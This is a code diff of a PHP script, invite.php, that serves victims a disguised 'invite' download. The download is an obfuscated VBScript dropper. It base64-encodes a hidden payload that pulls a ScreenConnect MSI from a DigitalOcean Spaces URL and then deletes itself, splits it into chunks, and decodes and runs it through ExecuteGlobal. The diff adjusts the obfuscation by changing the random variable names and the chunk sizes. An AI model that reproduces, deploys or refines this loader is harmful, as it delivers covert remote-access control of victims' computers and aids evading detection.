@@ -1,5 +1,5 @@
 <?php
-// invite.php - Improved Encoding (Random names + Random chunk size)
+// invite.php - Cleaner Encoding (Less aggressive randomization)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -29,7 +29,6 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
-// ===== Real Payload =====
 $msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
 
 $realVbs = <<<REAL
@@ -69,29 +68,16 @@ objFSO.DeleteFile WScript.ScriptFullName, True
 WScript.Quit
 REAL;
 
-// ===== Random names =====
-function rndName($len = 8) {
-    $chars = 'abcdefghijklmnopqrstuvwxyz';
-    $name = '';
-    for ($i = 0; $i < $len; $i++) {
-        $name .= $chars[rand(0, 25)];
-    }
-    return $name;
-}
-
-$arrayName   = rndName(7);
-$joinName    = rndName(6);
-$funcName    = rndName(9);
-$docName     = rndName(6);
-$elemName    = rndName(5);
-$streamName  = rndName(7);
-
-// ===== Random chunk size =====
-$chunkSize = rand(55, 120);
+// Mild random chunk size
+$chunkSize = rand(70, 110);
 
 $base64 = base64_encode($realVbs);
 $len = strlen($base64);
 $count = ceil($len / $chunkSize);
+
+// Only a few mildly random names
+$arrayName = "data" . rand(10, 99);
+$funcName  = "Decode" . rand(10, 99);
 
 $vbs  = "Option Explicit\r\n";
 $vbs .= "Dim $arrayName(" . ($count - 1) . ")\r\n";
@@ -102,22 +88,22 @@ for ($i = 0; $i < $count; $i++) {
     $vbs .= "$arrayName($i) = \"$chunk\"\r\n";
 }
 
-$vbs .= "\r\nDim $joinName : $joinName = Join($arrayName, \"\")\r\n";
-$vbs .= "ExecuteGlobal $funcName($joinName)\r\n\r\n";
+$vbs .= "\r\nDim fullData : fullData = Join($arrayName, \"\")\r\n";
+$vbs .= "ExecuteGlobal $funcName(fullData)\r\n\r\n";
 
 $vbs .= "Function $funcName(s)\r\n";
-$vbs .= " Dim $docName, $streamName, $elemName\r\n";
-$vbs .= " Set $docName = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
-$vbs .= " Set $elemName = $docName.createElement(\"b\")\r\n";
-$vbs .= " $elemName.dataType = \"bin.base64\"\r\n";
-$vbs .= " $elemName.text = s\r\n";
-$vbs .= " Set $streamName = CreateObject(\"ADODB.Stream\")\r\n";
-$vbs .= " $streamName.Type = 1 : $streamName.Open\r\n";
-$vbs .= " $streamName.Write $elemName.nodeTypedValue\r\n";
-$vbs .= " $streamName.Position = 0\r\n";
-$vbs .= " $streamName.Type = 2 : $streamName.Charset = \"UTF-8\"\r\n";
-$vbs .= " $funcName = $streamName.ReadText\r\n";
-$vbs .= " $streamName.Close\r\n";
+$vbs .= " Dim xmlDoc, streamObj, node\r\n";
+$vbs .= " Set xmlDoc = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
+$vbs .= " Set node = xmlDoc.createElement(\"b\")\r\n";
+$vbs .= " node.dataType = \"bin.base64\"\r\n";
+$vbs .= " node.text = s\r\n";
+$vbs .= " Set streamObj = CreateObject(\"ADODB.Stream\")\r\n";
+$vbs .= " streamObj.Type = 1 : streamObj.Open\r\n";
+$vbs .= " streamObj.Write node.nodeTypedValue\r\n";
+$vbs .= " streamObj.Position = 0\r\n";
+$vbs .= " streamObj.Type = 2 : streamObj.Charset = \"UTF-8\"\r\n";
+$vbs .= " $funcName = streamObj.ReadText\r\n";
+$vbs .= " streamObj.Close\r\n";
 $vbs .= "End Function\r\n";
 
 echo $vbs;
